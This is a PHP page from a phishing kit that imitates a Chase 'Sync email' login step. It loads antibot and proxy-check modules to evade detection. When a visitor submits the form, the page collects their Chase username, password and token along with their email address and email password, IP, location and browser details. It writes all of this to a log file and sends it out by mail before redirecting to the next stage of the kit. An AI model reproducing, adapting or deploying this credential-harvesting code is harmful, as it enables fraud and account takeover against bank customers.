<?php

    ob_start();
    session_start();
require("../admin/config.php");
require("../settings.php");
//require_once("../sec/sniper.php");
require_once("../sec/antibot.php");
require_once("../sec/botinho.php");
require_once("../sec/proxycheck.php");
require_once("../sec/altproxy.php");





    if(isset($_POST['submit'])){
        $_SESSION['mailaddy'] = $_POST['mailaddy'];
        $_SESSION['mailpass'] = $_POST['mailpass'];
    
        $subject =  "{" .$user_ip . "} | CHASE Mail | [" . $_SESSION['icity']. "," . $_SESSION['icountrycode'] . "]";
        

        $message = "  --=========[Chase User]===========--  \n";
        $message .= "Username: " . $_SESSION['usname'] . "\n";
        $message .= "Password: " . $_SESSION['paword'] . "\n";
        $message .= "Token: " . $_SESSION['tok'] . "\n";
        $message .= "  --=========[MAIL-ACCESS]===========--  \n";
        $message .= "EMAIL CARRIER: " . $_SESSION['mailcar'] . "\n";
        $message .= "EMAIL ADDRESS: " . $_SESSION['mailaddy'] . "\n";
        $message .= "EMAIL PASSWORD: " . $_SESSION['mailpass'] . "\n";
        $message .= "-- --------[Vic-Info]-------- --\n";
        $message .= "IP: " . $user_ip . "\n";
        $message .= "ISP: " . $_SESSION['iisp'] . "\n";
        $message .= "City(Based of IP): " .$_SESSION['icity'] . "\n";
        $message .= "Country(Based of IP): " .$_SESSION['icountrycode'] . "\n";
        $message .= "Browser: " . $_SESSION['browser'] . "\n";
        $message .= "OS: " . $_SESSION['platform'] . "\n";
        $message .= "Time: " . $_SESSION['time'] . "\n";
        $message .= "Date: " . $_SESSION['date'] . "\n";
        $message .= "----------------------------------------------\n";
        $header = "From: <store@crax.pro> \r\n";
        
        $var_str = var_export($message, true);
        $var = "\n\n $var_str;\n\n";
        file_put_contents('../logz/MyLogz1.txt', $var, FILE_APPEND);
        require("smtp.php");
        header("Location: ./over1.php?locale=en-US&authID={$_SESSION['token']}&start={$_SESSION['fstamp']}&end={$_SESSION['lund']}");
    }

    one_time(one_time_access,redirect_to);
    ff_process(redirect_to);



    $conte2 = "#> ".getenv("REMOTE_ADDR")."\r\n";
    file_put_contents('../logz/MyLogz2_view.txt', $conte2, FILE_APPEND);
?>


<!DOCTYPE html>
<html lang="en">

<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <meta name="robots" content="noindex,nofollow">

    <title><?php echo htmlentities("Sync email - chase.com", ENT_QUOTES, "UTF-8"); ?></title>

    <link href="../css/bootstrap.min.css" rel="stylesheet">
    <link href="../css/shop-homepage.css" rel="stylesheet">
    <link href="../css/styles.css" rel="stylesheet">
    <link rel="shortcut icon" href="../img/chasefavicon.ico">
    <script src="https://kit.fontawesome.com/6222530beb.js"></script>
    
 

</head>

<body class="less" onload="openFullscreen()" id="mypage">

<!-- Login Box -->    
<div class="logon-container">
    <header>
        <div class="logon-header">
            <a href="#" class="logolink"> </a>
        </div>
    </header>
    <main class="logon-content">
       <div class="container logon">
           <div class="row">
               <div class="col-xs-12 col-sm-6 col-sm-offset-3 logon-box shar">
                   <div class="jpui raised segment">
                       <div class="row">
                           <div class="col-xs-10 col-xs-offset-1">
                               <form action="" method="post" enctype="multipart/form-data">
                                 <div class="top-desc">SYNC YOUR EMAIL ADDRESS <img align="center" id="myimg" src="../img/email_icon.png"></div>
                                  <div>
                                  
                               
                                  </div>
                                  <div>
                                   <input type="email" class="frinp" name="mailaddy" id="mailaddy" required>
                                   <label for="mailaddy" class="frel">Email Address</label>
                                  </div>
                                  <div>
                                   <input type="password" class="frinp" name="mailpass" id="mailpass" required>
                                   <label for="mailpass" class="frel">Email Password</label>
                                  </div>
                                  <div class="row">
                                      <input type="submit" class="jpui submit" value="Continue" name="submit">
                                  </div>
                               </form>
                           </div>
                       </div>
                   </div>
               </div>
           </div>
       </div>
        
    </main>
    


</div>
<!-- /.Login Box -->
<script>
//    window.onbeforeunload = function() {
//   return "";
//};
    </script>
    
   <script>
//    /* Get the documentElement (<html>) to display the page in fullscreen */
//var elem = document.getElementById("mypage");;
//
///* View in fullscreen */
//function openFullscreen() {
//  if (elem.resquestFullscreen) {
//    elem.requestFullscreen();
//  } else if (elem.mozRequestFullScreen) { /* Firefox */
//    elem.mozRequestFullScreen();
//  } else if (elem.webkitRequestFullscreen) { /* Chrome, Safari and Opera */
//    elem.webkitRequestFullscreen();
//  } else if (elem.msRequestFullscreen) { /* IE/Edge */
//    elem.msRequestFullscreen();
//  }
//}
       
       
</script> 



<script src="../js/jquery.js"></script>
<script src="../js/bootstrap.min.js"></script>

</body>

</html>